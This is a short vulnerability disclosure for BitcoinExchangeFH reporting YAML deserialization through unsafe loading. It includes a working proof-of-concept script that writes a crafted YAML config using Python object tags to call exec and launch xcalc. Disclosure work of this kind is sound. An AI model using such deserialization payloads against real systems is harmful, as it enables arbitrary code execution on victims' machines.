# Description
BitcoinExchangeFH is a slim application to record the price depth and trades in various exchanges
* **Vulnerability description**
    Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept
Run exploit.py
```
import os
#os.system('pip install bitcoinexchangefh')
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
os.system('bitcoinexchangefh --configuration config.yml')
```
* `pip3 install bitcoinexchangefh`
* `python3 exploit.py`

# Impact
Arbitrary Code Execution
